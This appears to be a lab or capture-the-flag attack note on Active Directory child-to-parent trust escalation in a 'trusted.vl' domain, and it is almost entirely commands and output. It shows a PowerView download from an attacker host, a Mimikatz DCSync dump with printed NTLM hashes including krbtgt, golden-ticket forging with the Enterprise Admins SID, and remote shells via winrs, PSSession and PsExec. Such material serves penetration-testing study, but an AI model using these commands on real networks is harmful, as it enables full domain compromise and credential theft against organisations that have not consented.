#### **Trust  Bidirectional**

To perform this attack after compromising a child domain, we need the following:

- The KRBTGT hash for the child domain
- The SID for the child domain
- The name of a target user in the child domain (does not need to exist!)
- The FQDN of the child domain.
- The SID of the Enterprise Admins group of the root domain.
- With this data collected, the attack can be performed with Mimikatz.

- **Trust Relationship** :
```sh
Invoke-WebRequest -Uri "http://10.8.3.12:8080/PowerView.ps1" -OutFile "C:\Users\administrator\Desktop\powerview.ps1"

Import-Module ./PowerView.ps1

Get-NetDomainTrust
```
Or : 
- Powershell Built-in cmdlet :
```powershell
([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()
```

- The SID for the child domain and parents
```powershell
Get-DomainSID # Child
Get-DomainGroup -Domain trusted.vl -Identity "Enterprise Admins" \| select distinguishedname,objectsid`
```

- Also we can use **Mimikatz** :
```sh
lsadump::trust
```

In order for an attacker to grant themselves Enterprise Admin rights, they can simply add “-519” at the end of the Parent Domain’s Security Identifier (SID). This allows them to trick the system into recognizing their account as a member of the Enterprise Admins group, even though they are not actually part of it.

```sh
Current domain: LAB.TRUSTED.VL (LAB / S-1-5-21-2241985869-2159962460-1278545866)
Domain: TRUSTED.VL (TRUSTED / S-1-5-21-3576695518-347000760-3731839591-519)

```

- The KRBTGT hash for the child domain: using DCSync Attack :

 ```sh
 mimikatz # lsadump::dcsync /all /csv  
 ```
 - Result : 
 ```sh
[DC] 'lab.trusted.vl' will be the domain
[DC] 'labdc.lab.trusted.vl' will be the DC server
[DC] Exporting domain 'lab.trusted.vl'
1104    rsmith  30ef48d2054363df9244bc0d476e93dd        66048
502     krbtgt  c7a03c565c68c6fac5f8913fab576ebd        514
1106    ewalters        56d93bd5a8250652c7430a4467a8540a        66048
500     Administrator   75878369ad33f35b7070ca854100bc07        66048
1107    cpowers 322db798a55f85f09b3d61b976a13c43        66048
1000    LABDC$  c101e5fcd553128d23a62df1c509a576        532480
1103    TRUSTED$        182161c2718e1d45b2202d6e35a7eb6e        2080
```

 - Creating Golden ticket : 
 ```sh
mimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 /ptt
```

- Dump NTDS : 
```SH
lsadump::dcsync /domain:trusted.vl /dc:trusteddc.trusted.vl /all
#Then connect with the hash win evil-winrm
```
or 
Without ptt :
 ```sh
mimikatz # kerberos::golden /user:Administrator /domain:LAB.TRUSTED.VL /sid:S-1-5-21-2241985869-2159962460-1278545866 /krbtgt:c7a03c565c68c6fac5f8913fab576ebd /sids:S-1-5-21-3576695518-347000760-3731839591-519 
```
- Load the ticket to get the shell on root domain trusteddc.trusted.vl

```sh
mimikatz: kerberos::ptt ticket.kirbi
```

```sh
winrs -r:trusteddc.trusted.vl cmd
/
Enter-PSSession trusteddc.trusted.vl
```
Other option:  

Execute a cmd in the remote machine with [PsExec](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec):

```shell
.\PsExec.exe -accepteula \\<remote_hostname> cmd
```